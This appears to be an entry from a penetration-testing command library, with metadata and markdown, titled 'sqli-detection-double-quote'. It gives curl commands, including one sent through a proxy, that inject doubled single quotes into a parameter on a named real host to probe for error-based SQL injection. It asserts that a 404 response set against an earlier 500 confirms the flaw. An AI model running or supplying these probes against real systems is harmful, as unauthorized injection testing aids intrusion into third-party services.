---
data: 'curl "http://ipm.informatica.com/pls/apex/f?1''''=1" -v'
tags:
  - sqli
  - detection
type: command
output: HTTP/1.1 404 Not Found
executor: bash
platforms:
  - Linux
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:25.737Z'
id: b0072e84-1d34-48ec-988f-bd310e50e5bb
verified: false
validated: true
submitted: true
---
# sqli-detection-double-quote

## Command

```bash
curl "http://ipm.informatica.com/pls/apex/f?1''=1" -v
```

## Description

Follow-up test injecting double single quotes to observe a different error response, confirming the parameter's vulnerability to SQL injection.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target with double quote injection | Yes |
| -v | Verbose mode | No |

## Examples

### Basic Usage

```bash
curl "http://ipm.informatica.com/pls/apex/f?1''=1" -v
```

### Advanced Usage

```bash
curl -x http://proxy:8080 "http://ipm.informatica.com/pls/apex/f?1''=1" -v
```

## Expected Output

HTTP/1.1 404 Not Found, differentiating from the 500 error to validate SQLi.

## Related

- [[commands/sqli-detection-single-quote]]
- [[procedures/SQL-Injection-Detection-via-Error-Based-Testing]]
